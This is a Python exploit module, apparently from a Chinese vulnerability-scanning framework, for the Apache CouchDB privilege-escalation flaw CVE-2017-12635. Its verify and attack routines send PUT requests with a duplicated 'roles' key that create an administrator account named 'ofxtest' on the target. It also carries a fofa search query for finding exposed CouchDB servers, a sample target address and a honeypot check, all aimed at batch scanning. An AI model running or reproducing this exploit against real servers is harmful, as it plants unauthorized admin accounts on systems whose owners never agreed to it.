# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):
    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        注意！！！该POC是一次性的，对同一个目标用第二次就会失效  
        这就意味着初次扫描的结果就是最终结果，千万不要再批量扫一遍，结果会有很大的出入  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Apache Couchdb 远程权限提升(CVE-2017-12635)",                        # 漏洞名称
        "VulnID" : "CVE-2017-12635",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Apache Couchdb",                     # 漏洞应用名称
        "AppVersion" : "version<=1.7.0 && version<=2.1.1",                  # 漏洞应用版本
        "VulnDate" : "2017-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
        基于 Erlang 的 JSON 解析器和基于 JavaScript 的 JSON 解析器的差异，
        在 1.7.0 之前的 Apache CouchDB 和 2.1.1 之前的 2.x 中可以创建新的管理用户  
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="couchdb"
        """,                     # fofa搜索语句
        "example" : "http://104.248.136.47:7003",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  

    }


    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        if self.target.startswith("couchdb(http)://"):
            self.target = "http://" + self.target[16:]
        vuln = [False,""]
        url0 = self.target + "/_users/org.couchdb.user:ofxtest" # url自己按需调整
        # url2 = url_handle(host) + "/_session" # url自己按需调整

        data0 = "{\"type\": \"user\",\"name\": \"ofxtest\",\"roles\": [\"_admin\"],\"password\": \"ofxtest\"}"
        data1 = "{\"type\": \"user\",\"name\": \"ofxtest\",\"roles\": [\"_admin\"],\"roles\": [],\"password\": \"ofxtest\"}"
        # data2 = "name=asasas&password=asasas"

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
            """
            req0 = requests.put(url0,data=data0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            req1 = requests.put(url0,data=data1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if req1.status_code == 201 and "\"ok\":true" in req1.text:
                
                vuln = [True,req1.text]
                
            else:
                vuln = [False,req1.text]
        except Exception as e:
            raise e

        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()